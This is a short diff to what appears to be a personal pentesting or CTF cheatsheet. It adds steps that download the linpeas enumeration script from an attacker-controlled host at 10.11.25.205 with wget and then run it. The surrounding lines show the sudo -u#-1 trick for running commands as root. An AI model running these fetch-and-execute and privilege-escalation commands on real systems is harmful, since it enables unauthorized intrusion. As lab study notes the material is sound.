@@ -18,6 +18,12 @@ title: "Cheatsheet"
 `sudo -u#-1 whoami`<br />
 `sudo -u#-1 <path_of_executable_as_other_user>`
 
+### Linpeas
+wget 10.11.25.205:8080/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh > linlog.txt
+less -R linlog.txt
+
 ### Execute as diffent user
 `sudo -u <user> <command>`
 
